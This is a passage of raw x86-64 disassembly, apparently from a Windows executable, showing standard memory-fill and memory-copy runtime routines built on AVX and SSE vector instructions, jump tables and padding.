   14000df3b:	c5 fd 7f 81 a0 00 00 	vmovdqa %ymm0,0xa0(%rcx)
   14000df42:	00 
   14000df43:	c5 fd 7f 81 c0 00 00 	vmovdqa %ymm0,0xc0(%rcx)
   14000df4a:	00 
   14000df4b:	c5 fd 7f 81 e0 00 00 	vmovdqa %ymm0,0xe0(%rcx)
   14000df52:	00 
   14000df53:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   14000df5a:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   14000df61:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   14000df68:	73 b6                	jae    0x14000df20
   14000df6a:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   14000df6e:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   14000df72:	4d 8b d9             	mov    %r9,%r11
   14000df75:	49 c1 eb 05          	shr    $0x5,%r11
   14000df79:	47 8b 9c 9a b0 69 01 	mov    0x169b0(%r10,%r11,4),%r11d
   14000df80:	00 
   14000df81:	4d 03 da             	add    %r10,%r11
   14000df84:	41 ff e3             	jmp    *%r11
   14000df87:	c4 a1 7e 7f 84 09 00 	vmovdqu %ymm0,-0x100(%rcx,%r9,1)
   14000df8e:	ff ff ff 
   14000df91:	c4 a1 7e 7f 84 09 20 	vmovdqu %ymm0,-0xe0(%rcx,%r9,1)
   14000df98:	ff ff ff 
   14000df9b:	c4 a1 7e 7f 84 09 40 	vmovdqu %ymm0,-0xc0(%rcx,%r9,1)
   14000dfa2:	ff ff ff 
   14000dfa5:	c4 a1 7e 7f 84 09 60 	vmovdqu %ymm0,-0xa0(%rcx,%r9,1)
   14000dfac:	ff ff ff 
   14000dfaf:	c4 a1 7e 7f 44 09 80 	vmovdqu %ymm0,-0x80(%rcx,%r9,1)
   14000dfb6:	c4 a1 7e 7f 44 09 a0 	vmovdqu %ymm0,-0x60(%rcx,%r9,1)
   14000dfbd:	c4 a1 7e 7f 44 09 c0 	vmovdqu %ymm0,-0x40(%rcx,%r9,1)
   14000dfc4:	c4 a1 7e 7f 44 01 e0 	vmovdqu %ymm0,-0x20(%rcx,%r8,1)
   14000dfcb:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   14000dfcf:	c5 f8 77             	vzeroupper
   14000dfd2:	c3                   	ret
   14000dfd3:	66 66 66 66 66 0f 1f 	data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000dfda:	84 00 00 00 00 00 
   14000dfe0:	c5 fd e7 01          	vmovntdq %ymm0,(%rcx)
   14000dfe4:	c5 fd e7 41 20       	vmovntdq %ymm0,0x20(%rcx)
   14000dfe9:	c5 fd e7 41 40       	vmovntdq %ymm0,0x40(%rcx)
   14000dfee:	c5 fd e7 41 60       	vmovntdq %ymm0,0x60(%rcx)
   14000dff3:	c5 fd e7 81 80 00 00 	vmovntdq %ymm0,0x80(%rcx)
   14000dffa:	00 
   14000dffb:	c5 fd e7 81 a0 00 00 	vmovntdq %ymm0,0xa0(%rcx)
   14000e002:	00 
   14000e003:	c5 fd e7 81 c0 00 00 	vmovntdq %ymm0,0xc0(%rcx)
   14000e00a:	00 
   14000e00b:	c5 fd e7 81 e0 00 00 	vmovntdq %ymm0,0xe0(%rcx)
   14000e012:	00 
   14000e013:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   14000e01a:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   14000e021:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   14000e028:	73 b6                	jae    0x14000dfe0
   14000e02a:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   14000e02e:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   14000e032:	4d 8b d9             	mov    %r9,%r11
   14000e035:	49 c1 eb 05          	shr    $0x5,%r11
   14000e039:	47 8b 9c 9a d4 69 01 	mov    0x169d4(%r10,%r11,4),%r11d
   14000e040:	00 
   14000e041:	4d 03 da             	add    %r10,%r11
   14000e044:	41 ff e3             	jmp    *%r11
   14000e047:	c4 a1 7d e7 84 09 00 	vmovntdq %ymm0,-0x100(%rcx,%r9,1)
   14000e04e:	ff ff ff 
   14000e051:	c4 a1 7d e7 84 09 20 	vmovntdq %ymm0,-0xe0(%rcx,%r9,1)
   14000e058:	ff ff ff 
   14000e05b:	c4 a1 7d e7 84 09 40 	vmovntdq %ymm0,-0xc0(%rcx,%r9,1)
   14000e062:	ff ff ff 
   14000e065:	c4 a1 7d e7 84 09 60 	vmovntdq %ymm0,-0xa0(%rcx,%r9,1)
   14000e06c:	ff ff ff 
   14000e06f:	c4 a1 7d e7 44 09 80 	vmovntdq %ymm0,-0x80(%rcx,%r9,1)
   14000e076:	c4 a1 7d e7 44 09 a0 	vmovntdq %ymm0,-0x60(%rcx,%r9,1)
   14000e07d:	c4 a1 7d e7 44 09 c0 	vmovntdq %ymm0,-0x40(%rcx,%r9,1)
   14000e084:	c4 a1 7e 7f 44 01 e0 	vmovdqu %ymm0,-0x20(%rcx,%r8,1)
   14000e08b:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   14000e08f:	0f ae f8             	sfence
   14000e092:	c5 f8 77             	vzeroupper
   14000e095:	c3                   	ret
   14000e096:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000e09d:	00 00 00 
   14000e0a0:	4c 3b 05 79 af 00 00 	cmp    0xaf79(%rip),%r8        # 0x140019020
   14000e0a7:	76 0d                	jbe    0x14000e0b6
   14000e0a9:	f6 05 94 ba 00 00 02 	testb  $0x2,0xba94(%rip)        # 0x140019b44
   14000e0b0:	0f 85 2a fd ff ff    	jne    0x14000dde0
   14000e0b6:	4c 8b c9             	mov    %rcx,%r9
   14000e0b9:	49 83 e1 0f          	and    $0xf,%r9
   14000e0bd:	49 83 e9 10          	sub    $0x10,%r9
   14000e0c1:	49 2b c9             	sub    %r9,%rcx
   14000e0c4:	49 2b d1             	sub    %r9,%rdx
   14000e0c7:	4d 03 c1             	add    %r9,%r8
   14000e0ca:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   14000e0d1:	76 4b                	jbe    0x14000e11e
   14000e0d3:	66 66 66 66 66 0f 1f 	data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000e0da:	84 00 00 00 00 00 
   14000e0e0:	66 0f 7f 01          	movdqa %xmm0,(%rcx)
   14000e0e4:	66 0f 7f 41 10       	movdqa %xmm0,0x10(%rcx)
   14000e0e9:	66 0f 7f 41 20       	movdqa %xmm0,0x20(%rcx)
   14000e0ee:	66 0f 7f 41 30       	movdqa %xmm0,0x30(%rcx)
   14000e0f3:	66 0f 7f 41 40       	movdqa %xmm0,0x40(%rcx)
   14000e0f8:	66 0f 7f 41 50       	movdqa %xmm0,0x50(%rcx)
   14000e0fd:	66 0f 7f 41 60       	movdqa %xmm0,0x60(%rcx)
   14000e102:	66 0f 7f 41 70       	movdqa %xmm0,0x70(%rcx)
   14000e107:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   14000e10e:	49 81 e8 80 00 00 00 	sub    $0x80,%r8
   14000e115:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   14000e11c:	73 c2                	jae    0x14000e0e0
   14000e11e:	4d 8d 48 0f          	lea    0xf(%r8),%r9
   14000e122:	49 83 e1 f0          	and    $0xfffffffffffffff0,%r9
   14000e126:	4d 8b d9             	mov    %r9,%r11
   14000e129:	49 c1 eb 04          	shr    $0x4,%r11
   14000e12d:	47 8b 9c 9a f8 69 01 	mov    0x169f8(%r10,%r11,4),%r11d
   14000e134:	00 
   14000e135:	4d 03 da             	add    %r10,%r11
   14000e138:	41 ff e3             	jmp    *%r11
   14000e13b:	f3 42 0f 7f 44 09 80 	movdqu %xmm0,-0x80(%rcx,%r9,1)
   14000e142:	f3 42 0f 7f 44 09 90 	movdqu %xmm0,-0x70(%rcx,%r9,1)
   14000e149:	f3 42 0f 7f 44 09 a0 	movdqu %xmm0,-0x60(%rcx,%r9,1)
   14000e150:	f3 42 0f 7f 44 09 b0 	movdqu %xmm0,-0x50(%rcx,%r9,1)
   14000e157:	f3 42 0f 7f 44 09 c0 	movdqu %xmm0,-0x40(%rcx,%r9,1)
   14000e15e:	f3 42 0f 7f 44 09 d0 	movdqu %xmm0,-0x30(%rcx,%r9,1)
   14000e165:	f3 42 0f 7f 44 09 e0 	movdqu %xmm0,-0x20(%rcx,%r9,1)
   14000e16c:	f3 42 0f 7f 44 01 f0 	movdqu %xmm0,-0x10(%rcx,%r8,1)
   14000e173:	f3 0f 7f 00          	movdqu %xmm0,(%rax)
   14000e177:	c3                   	ret
   14000e178:	cc                   	int3
   14000e179:	cc                   	int3
   14000e17a:	cc                   	int3
   14000e17b:	cc                   	int3
   14000e17c:	cc                   	int3
   14000e17d:	cc                   	int3
   14000e17e:	cc                   	int3
   14000e17f:	cc                   	int3
   14000e180:	cc                   	int3
   14000e181:	cc                   	int3
   14000e182:	cc                   	int3
   14000e183:	cc                   	int3
   14000e184:	cc                   	int3
   14000e185:	cc                   	int3
   14000e186:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000e18d:	00 00 00 
   14000e190:	cc                   	int3
   14000e191:	cc                   	int3
   14000e192:	cc                   	int3
   14000e193:	cc                   	int3
   14000e194:	cc                   	int3
   14000e195:	cc                   	int3
   14000e196:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000e19d:	00 00 00 
   14000e1a0:	57                   	push   %rdi
   14000e1a1:	56                   	push   %rsi
   14000e1a2:	48 8b f9             	mov    %rcx,%rdi
   14000e1a5:	48 8b f2             	mov    %rdx,%rsi
   14000e1a8:	49 8b c8             	mov    %r8,%rcx
   14000e1ab:	f3 a4                	rep movsb (%rsi),(%rdi)
   14000e1ad:	5e                   	pop    %rsi
   14000e1ae:	5f                   	pop    %rdi
   14000e1af:	c3                   	ret
   14000e1b0:	48 8b c1             	mov    %rcx,%rax
   14000e1b3:	4c 8d 15 46 1e ff ff 	lea    -0xe1ba(%rip),%r10        # 0x140000000
   14000e1ba:	49 83 f8 0f          	cmp    $0xf,%r8
   14000e1be:	0f 87 0c 01 00 00    	ja     0x14000e2d0
   14000e1c4:	66 66 66 66 0f 1f 84 	data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000e1cb:	00 00 00 00 00 
   14000e1d0:	47 8b 8c 82 20 6a 01 	mov    0x16a20(%r10,%r8,4),%r9d
   14000e1d7:	00 
   14000e1d8:	4d 03 ca             	add    %r10,%r9
   14000e1db:	41 ff e1             	jmp    *%r9
   14000e1de:	c3                   	ret
   14000e1df:	90                   	nop
   14000e1e0:	4c 8b 02             	mov    (%rdx),%r8
   14000e1e3:	8b 4a 08             	mov    0x8(%rdx),%ecx
   14000e1e6:	44 0f b7 4a 0c       	movzwl 0xc(%rdx),%r9d
   14000e1eb:	44 0f b6 52 0e       	movzbl 0xe(%rdx),%r10d
   14000e1f0:	4c 89 00             	mov    %r8,(%rax)
   14000e1f3:	89 48 08             	mov    %ecx,0x8(%rax)
   14000e1f6:	66 44 89 48 0c       	mov    %r9w,0xc(%rax)
   14000e1fb:	44 88 50 0e          	mov    %r10b,0xe(%rax)
   14000e1ff:	c3                   	ret
   14000e200:	4c 8b 02             	mov    (%rdx),%r8
   14000e203:	0f b7 4a 08          	movzwl 0x8(%rdx),%ecx
   14000e207:	44 0f b6 4a 0a       	movzbl 0xa(%rdx),%r9d
   14000e20c:	4c 89 00             	mov    %r8,(%rax)
   14000e20f:	66 89 48 08          	mov    %cx,0x8(%rax)
   14000e213:	44 88 48 0a          	mov    %r9b,0xa(%rax)
   14000e217:	c3                   	ret
   14000e218:	0f b7 0a             	movzwl (%rdx),%ecx
   14000e21b:	66 89 08             	mov    %cx,(%rax)
   14000e21e:	c3                   	ret
   14000e21f:	90                   	nop
   14000e220:	8b 0a                	mov    (%rdx),%ecx
   14000e222:	44 0f b7 42 04       	movzwl 0x4(%rdx),%r8d
   14000e227:	44 0f b6 4a 06       	movzbl 0x6(%rdx),%r9d
   14000e22c:	89 08                	mov    %ecx,(%rax)
   14000e22e:	66 44 89 40 04       	mov    %r8w,0x4(%rax)
   14000e233:	44 88 48 06          	mov    %r9b,0x6(%rax)
   14000e237:	c3                   	ret
   14000e238:	4c 8b 02             	mov    (%rdx),%r8
   14000e23b:	8b 4a 08             	mov    0x8(%rdx),%ecx
   14000e23e:	44 0f b7 4a 0c       	movzwl 0xc(%rdx),%r9d
   14000e243:	4c 89 00             	mov    %r8,(%rax)
   14000e246:	89 48 08             	mov    %ecx,0x8(%rax)
   14000e249:	66 44 89 48 0c       	mov    %r9w,0xc(%rax)
   14000e24e:	c3                   	ret
   14000e24f:	0f b7 0a             	movzwl (%rdx),%ecx
   14000e252:	44 0f b6 42 02       	movzbl 0x2(%rdx),%r8d
   14000e257:	66 89 08             	mov    %cx,(%rax)
   14000e25a:	44 88 40 02          	mov    %r8b,0x2(%rax)
   14000e25e:	c3                   	ret
   14000e25f:	90                   	nop
   14000e260:	4c 8b 02             	mov    (%rdx),%r8
   14000e263:	8b 4a 08             	mov    0x8(%rdx),%ecx
   14000e266:	44 0f b6 4a 0c       	movzbl 0xc(%rdx),%r9d
   14000e26b:	4c 89 00             	mov    %r8,(%rax)
   14000e26e:	89 48 08             	mov    %ecx,0x8(%rax)
   14000e271:	44 88 48 0c          	mov    %r9b,0xc(%rax)
   14000e275:	c3                   	ret
   14000e276:	4c 8b 02             	mov    (%rdx),%r8
   14000e279:	0f b7 4a 08          	movzwl 0x8(%rdx),%ecx
   14000e27d:	4c 89 00             	mov    %r8,(%rax)
   14000e280:	66 89 48 08          	mov    %cx,0x8(%rax)
   14000e284:	c3                   	ret
   14000e285:	4c 8b 02             	mov    (%rdx),%r8
   14000e288:	0f b6 4a 08          	movzbl 0x8(%rdx),%ecx
   14000e28c:	4c 89 00             	mov    %r8,(%rax)
   14000e28f:	88 48 08             	mov    %cl,0x8(%rax)
   14000e292:	c3                   	ret
   14000e293:	4c 8b 02             	mov    (%rdx),%r8
   14000e296:	8b 4a 08             	mov    0x8(%rdx),%ecx
   14000e299:	4c 89 00             	mov    %r8,(%rax)
   14000e29c:	89 48 08             	mov    %ecx,0x8(%rax)
   14000e29f:	c3                   	ret
   14000e2a0:	8b 0a                	mov    (%rdx),%ecx
   14000e2a2:	44 0f b7 42 04       	movzwl 0x4(%rdx),%r8d
   14000e2a7:	89 08                	mov    %ecx,(%rax)
   14000e2a9:	66 44 89 40 04       	mov    %r8w,0x4(%rax)
   14000e2ae:	c3                   	ret
   14000e2af:	8b 0a                	mov    (%rdx),%ecx
   14000e2b1:	44 0f b6 42 04       	movzbl 0x4(%rdx),%r8d
   14000e2b6:	89 08                	mov    %ecx,(%rax)
   14000e2b8:	44 88 40 04          	mov    %r8b,0x4(%rax)
   14000e2bc:	c3                   	ret
   14000e2bd:	48 8b 0a             	mov    (%rdx),%rcx
   14000e2c0:	48 89 08             	mov    %rcx,(%rax)
   14000e2c3:	c3                   	ret
   14000e2c4:	0f b6 0a             	movzbl (%rdx),%ecx
   14000e2c7:	88 08                	mov    %cl,(%rax)
   14000e2c9:	c3                   	ret
   14000e2ca:	8b 0a                	mov    (%rdx),%ecx
   14000e2cc:	89 08                	mov    %ecx,(%rax)
   14000e2ce:	c3                   	ret
   14000e2cf:	90                   	nop
   14000e2d0:	49 83 f8 20          	cmp    $0x20,%r8
   14000e2d4:	77 17                	ja     0x14000e2ed
   14000e2d6:	f3 0f 6f 0a          	movdqu (%rdx),%xmm1
   14000e2da:	f3 42 0f 6f 54 02 f0 	movdqu -0x10(%rdx,%r8,1),%xmm2
   14000e2e1:	f3 0f 7f 09          	movdqu %xmm1,(%rcx)
   14000e2e5:	f3 42 0f 7f 54 01 f0 	movdqu %xmm2,-0x10(%rcx,%r8,1)
   14000e2ec:	c3                   	ret
   14000e2ed:	4e 8d 0c 02          	lea    (%rdx,%r8,1),%r9
   14000e2f1:	48 3b ca             	cmp    %rdx,%rcx
   14000e2f4:	4c 0f 46 c9          	cmovbe %rcx,%r9
   14000e2f8:	49 3b c9             	cmp    %r9,%rcx
   14000e2fb:	0f 82 3f 04 00 00    	jb     0x14000e740
   14000e301:	83 3d 10 ad 00 00 03 	cmpl   $0x3,0xad10(%rip)        # 0x140019018
   14000e308:	0f 82 e2 02 00 00    	jb     0x14000e5f0
   14000e30e:	49 81 f8 00 20 00 00 	cmp    $0x2000,%r8
   14000e315:	76 16                	jbe    0x14000e32d
   14000e317:	49 81 f8 00 00 18 00 	cmp    $0x180000,%r8
   14000e31e:	77 0d                	ja     0x14000e32d
   14000e320:	f6 05 1d b8 00 00 02 	testb  $0x2,0xb81d(%rip)        # 0x140019b44
   14000e327:	0f 85 73 fe ff ff    	jne    0x14000e1a0
   14000e32d:	c5 fe 6f 02          	vmovdqu (%rdx),%ymm0
   14000e331:	c4 a1 7e 6f 6c 02 e0 	vmovdqu -0x20(%rdx,%r8,1),%ymm5
   14000e338:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   14000e33f:	0f 86 c3 00 00 00    	jbe    0x14000e408
   14000e345:	4c 8b c9             	mov    %rcx,%r9
   14000e348:	49 83 e1 1f          	and    $0x1f,%r9
   14000e34c:	49 83 e9 20          	sub    $0x20,%r9
   14000e350:	49 2b c9             	sub    %r9,%rcx
   14000e353:	49 2b d1             	sub    %r9,%rdx
   14000e356:	4d 03 c1             	add    %r9,%r8
   14000e359:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   14000e360:	0f 86 a2 00 00 00    	jbe    0x14000e408
   14000e366:	49 81 f8 00 00 18 00 	cmp    $0x180000,%r8
   14000e36d:	0f 87 3d 01 00 00    	ja     0x14000e4b0
   14000e373:	66 66 66 66 66 0f 1f 	data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000e37a:	84 00 00 00 00 00 
   14000e380:	c5 fe 6f 0a          	vmovdqu (%rdx),%ymm1
   14000e384:	c5 fe 6f 52 20       	vmovdqu 0x20(%rdx),%ymm2
   14000e389:	c5 fe 6f 5a 40       	vmovdqu 0x40(%rdx),%ymm3
   14000e38e:	c5 fe 6f 62 60       	vmovdqu 0x60(%rdx),%ymm4
   14000e393:	c5 fd 7f 09          	vmovdqa %ymm1,(%rcx)
   14000e397:	c5 fd 7f 51 20       	vmovdqa %ymm2,0x20(%rcx)
   14000e39c:	c5 fd 7f 59 40       	vmovdqa %ymm3,0x40(%rcx)
   14000e3a1:	c5 fd 7f 61 60       	vmovdqa %ymm4,0x60(%rcx)
   14000e3a6:	c5 fe 6f 8a 80 00 00 	vmovdqu 0x80(%rdx),%ymm1
   14000e3ad:	00 
   14000e3ae:	c5 fe 6f 92 a0 00 00 	vmovdqu 0xa0(%rdx),%ymm2
   14000e3b5:	00 
   14000e3b6:	c5 fe 6f 9a c0 00 00 	vmovdqu 0xc0(%rdx),%ymm3
   14000e3bd:	00 
   14000e3be:	c5 fe 6f a2 e0 00 00 	vmovdqu 0xe0(%rdx),%ymm4
   14000e3c5:	00 
   14000e3c6:	c5 fd 7f 89 80 00 00 	vmovdqa %ymm1,0x80(%rcx)
   14000e3cd:	00 
   14000e3ce:	c5 fd 7f 91 a0 00 00 	vmovdqa %ymm2,0xa0(%rcx)
   14000e3d5:	00 
   14000e3d6:	c5 fd 7f 99 c0 00 00 	vmovdqa %ymm3,0xc0(%rcx)
   14000e3dd:	00 
   14000e3de:	c5 fd 7f a1 e0 00 00 	vmovdqa %ymm4,0xe0(%rcx)
   14000e3e5:	00 
   14000e3e6:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   14000e3ed:	48 81 c2 00 01 00 00 	add    $0x100,%rdx
   14000e3f4:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   14000e3fb:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   14000e402:	0f 83 78 ff ff ff    	jae    0x14000e380
   14000e408:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   14000e40c:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   14000e410:	4d 8b d9             	mov    %r9,%r11
   14000e413:	49 c1 eb 05          	shr    $0x5,%r11
   14000e417:	47 8b 9c 9a 60 6a 01 	mov    0x16a60(%r10,%r11,4),%r11d
   14000e41e:	00 
   14000e41f:	4d 03 da             	add    %r10,%r11
   14000e422:	41 ff e3             	jmp    *%r11
   14000e425:	c4 a1 7e 6f 8c 0a 00 	vmovdqu -0x100(%rdx,%r9,1),%ymm1
   14000e42c:	ff ff ff 
   14000e42f:	c4 a1 7e 7f 8c 09 00 	vmovdqu %ymm1,-0x100(%rcx,%r9,1)
   14000e436:	ff ff ff 
   14000e439:	c4 a1 7e 6f 8c 0a 20 	vmovdqu -0xe0(%rdx,%r9,1),%ymm1
   14000e440:	ff ff ff 
   14000e443:	c4 a1 7e 7f 8c 09 20 	vmovdqu %ymm1,-0xe0(%rcx,%r9,1)
   14000e44a:	ff ff ff 
   14000e44d:	c4 a1 7e 6f 8c 0a 40 	vmovdqu -0xc0(%rdx,%r9,1),%ymm1
   14000e454:	ff ff ff 
   14000e457:	c4 a1 7e 7f 8c 09 40 	vmovdqu %ymm1,-0xc0(%rcx,%r9,1)
   14000e45e:	ff ff ff 
   14000e461:	c4 a1 7e 6f 8c 0a 60 	vmovdqu -0xa0(%rdx,%r9,1),%ymm1
   14000e468:	ff ff ff 
   14000e46b:	c4 a1 7e 7f 8c 09 60 	vmovdqu %ymm1,-0xa0(%rcx,%r9,1)
   14000e472:	ff ff ff 
   14000e475:	c4 a1 7e 6f 4c 0a 80 	vmovdqu -0x80(%rdx,%r9,1),%ymm1
   14000e47c:	c4 a1 7e 7f 4c 09 80 	vmovdqu %ymm1,-0x80(%rcx,%r9,1)
   14000e483:	c4 a1 7e 6f 4c 0a a0 	vmovdqu -0x60(%rdx,%r9,1),%ymm1
   14000e48a:	c4 a1 7e 7f 4c 09 a0 	vmovdqu %ymm1,-0x60(%rcx,%r9,1)
   14000e491:	c4 a1 7e 6f 4c 0a c0 	vmovdqu -0x40(%rdx,%r9,1),%ymm1
   14000e498:	c4 a1 7e 7f 4c 09 c0 	vmovdqu %ymm1,-0x40(%rcx,%r9,1)
   14000e49f:	c4 a1 7e 7f 6c 01 e0 	vmovdqu %ymm5,-0x20(%rcx,%r8,1)
   14000e4a6:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   14000e4aa:	c5 f8 77             	vzeroupper
   14000e4ad:	c3                   	ret
   14000e4ae:	66 90                	xchg   %ax,%ax
   14000e4b0:	c5 fe 6f 0a          	vmovdqu (%rdx),%ymm1
   14000e4b4:	c5 fe 6f 52 20       	vmovdqu 0x20(%rdx),%ymm2
   14000e4b9:	c5 fe 6f 5a 40       	vmovdqu 0x40(%rdx),%ymm3
   14000e4be:	c5 fe 6f 62 60       	vmovdqu 0x60(%rdx),%ymm4
   14000e4c3:	c5 fd e7 09          	vmovntdq %ymm1,(%rcx)
   14000e4c7:	c5 fd e7 51 20       	vmovntdq %ymm2,0x20(%rcx)
   14000e4cc:	c5 fd e7 59 40       	vmovntdq %ymm3,0x40(%rcx)
   14000e4d1:	c5 fd e7 61 60       	vmovntdq %ymm4,0x60(%rcx)
   14000e4d6:	c5 fe 6f 8a 80 00 00 	vmovdqu 0x80(%rdx),%ymm1
   14000e4dd:	00 
   14000e4de:	c5 fe 6f 92 a0 00 00 	vmovdqu 0xa0(%rdx),%ymm2
   14000e4e5:	00 
   14000e4e6:	c5 fe 6f 9a c0 00 00 	vmovdqu 0xc0(%rdx),%ymm3
   14000e4ed:	00 
   14000e4ee:	c5 fe 6f a2 e0 00 00 	vmovdqu 0xe0(%rdx),%ymm4
   14000e4f5:	00 
   14000e4f6:	c5 fd e7 89 80 00 00 	vmovntdq %ymm1,0x80(%rcx)
   14000e4fd:	00 
   14000e4fe:	c5 fd e7 91 a0 00 00 	vmovntdq %ymm2,0xa0(%rcx)
   14000e505:	00 
   14000e506:	c5 fd e7 99 c0 00 00 	vmovntdq %ymm3,0xc0(%rcx)
   14000e50d:	00 
   14000e50e:	c5 fd e7 a1 e0 00 00 	vmovntdq %ymm4,0xe0(%rcx)
   14000e515:	00 
   14000e516:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   14000e51d:	48 81 c2 00 01 00 00 	add    $0x100,%rdx
   14000e524:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   14000e52b:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   14000e532:	0f 83 78 ff ff ff    	jae    0x14000e4b0
   14000e538:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   14000e53c:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   14000e540:	4d 8b d9             	mov    %r9,%r11
   14000e543:	49 c1 eb 05          	shr    $0x5,%r11
   14000e547:	47 8b 9c 9a 84 6a 01 	mov    0x16a84(%r10,%r11,4),%r11d
   14000e54e:	00 
   14000e54f:	4d 03 da             	add    %r10,%r11
   14000e552:	41 ff e3             	jmp    *%r11
   14000e555:	c4 a1 7e 6f 8c 0a 00 	vmovdqu -0x100(%rdx,%r9,1),%ymm1
   14000e55c:	ff ff ff 
   14000e55f:	c4 a1 7d e7 8c 09 00 	vmovntdq %ymm1,-0x100(%rcx,%r9,1)
   14000e566:	ff ff ff 
   14000e569:	c4 a1 7e 6f 8c 0a 20 	vmovdqu -0xe0(%rdx,%r9,1),%ymm1
   14000e570:	ff ff ff 
   14000e573:	c4 a1 7d e7 8c 09 20 	vmovntdq %ymm1,-0xe0(%rcx,%r9,1)
   14000e57a:	ff ff ff 
   14000e57d:	c4 a1 7e 6f 8c 0a 40 	vmovdqu -0xc0(%rdx,%r9,1),%ymm1
   14000e584:	ff ff ff 
   14000e587:	c4 a1 7d e7 8c 09 40 	vmovntdq %ymm1,-0xc0(%rcx,%r9,1)
   14000e58e:	ff ff ff 
   14000e591:	c4 a1 7e 6f 8c 0a 60 	vmovdqu -0xa0(%rdx,%r9,1),%ymm1
   14000e598:	ff ff ff 
   14000e59b:	c4 a1 7d e7 8c 09 60 	vmovntdq %ymm1,-0xa0(%rcx,%r9,1)
   14000e5a2:	ff ff ff 
   14000e5a5:	c4 a1 7e 6f 4c 0a 80 	vmovdqu -0x80(%rdx,%r9,1),%ymm1
   14000e5ac:	c4 a1 7d e7 4c 09 80 	vmovntdq %ymm1,-0x80(%rcx,%r9,1)
   14000e5b3:	c4 a1 7e 6f 4c 0a a0 	vmovdqu -0x60(%rdx,%r9,1),%ymm1
   14000e5ba:	c4 a1 7d e7 4c 09 a0 	vmovntdq %ymm1,-0x60(%rcx,%r9,1)
   14000e5c1:	c4 a1 7e 6f 4c 0a c0 	vmovdqu -0x40(%rdx,%r9,1),%ymm1
   14000e5c8:	c4 a1 7d e7 4c 09 c0 	vmovntdq %ymm1,-0x40(%rcx,%r9,1)
   14000e5cf:	c4 a1 7e 7f 6c 01 e0 	vmovdqu %ymm5,-0x20(%rcx,%r8,1)
   14000e5d6:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   14000e5da:	0f ae f8             	sfence
   14000e5dd:	c5 f8 77             	vzeroupper
   14000e5e0:	c3                   	ret
   14000e5e1:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000e5e8:	0f 1f 84 00 00 00 00 
   14000e5ef:	00 
   14000e5f0:	49 81 f8 00 08 00 00 	cmp    $0x800,%r8
   14000e5f7:	76 0d                	jbe    0x14000e606
   14000e5f9:	f6 05 44 b5 00 00 02 	testb  $0x2,0xb544(%rip)        # 0x140019b44
   14000e600:	0f 85 9a fb ff ff    	jne    0x14000e1a0
   14000e606:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   14000e60a:	f3 42 0f 6f 6c 02 f0 	movdqu -0x10(%rdx,%r8,1),%xmm5
   14000e611:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   14000e618:	0f 86 8e 00 00 00    	jbe    0x14000e6ac
   14000e61e:	4c 8b c9             	mov    %rcx,%r9
   14000e621:	49 83 e1 0f          	and    $0xf,%r9
   14000e625:	49 83 e9 10          	sub    $0x10,%r9
   14000e629:	49 2b c9             	sub    %r9,%rcx
   14000e62c:	49 2b d1             	sub    %r9,%rdx
   14000e62f:	4d 03 c1             	add    %r9,%r8
   14000e632:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   14000e639:	76 71                	jbe    0x14000e6ac
   14000e63b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000e640:	f3 0f 6f 0a          	movdqu (%rdx),%xmm1
   14000e644:	f3 0f 6f 52 10       	movdqu 0x10(%rdx),%xmm2
   14000e649:	f3 0f 6f 5a 20       	movdqu 0x20(%rdx),%xmm3
   14000e64e:	f3 0f 6f 62 30       	movdqu 0x30(%rdx),%xmm4
   14000e653:	66 0f 7f 09          	movdqa %xmm1,(%rcx)
   14000e657:	66 0f 7f 51 10       	movdqa %xmm2,0x10(%rcx)
   14000e65c:	66 0f 7f 59 20       	movdqa %xmm3,0x20(%rcx)
   14000e661:	66 0f 7f 61 30       	movdqa %xmm4,0x30(%rcx)
   14000e666:	f3 0f 6f 4a 40       	movdqu 0x40(%rdx),%xmm1
   14000e66b:	f3 0f 6f 52 50       	movdqu 0x50(%rdx),%xmm2
   14000e670:	f3 0f 6f 5a 60       	movdqu 0x60(%rdx),%xmm3
   14000e675:	f3 0f 6f 62 70       	movdqu 0x70(%rdx),%xmm4
   14000e67a:	66 0f 7f 49 40       	movdqa %xmm1,0x40(%rcx)
   14000e67f:	66 0f 7f 51 50       	movdqa %xmm2,0x50(%rcx)
   14000e684:	66 0f 7f 59 60       	movdqa %xmm3,0x60(%rcx)
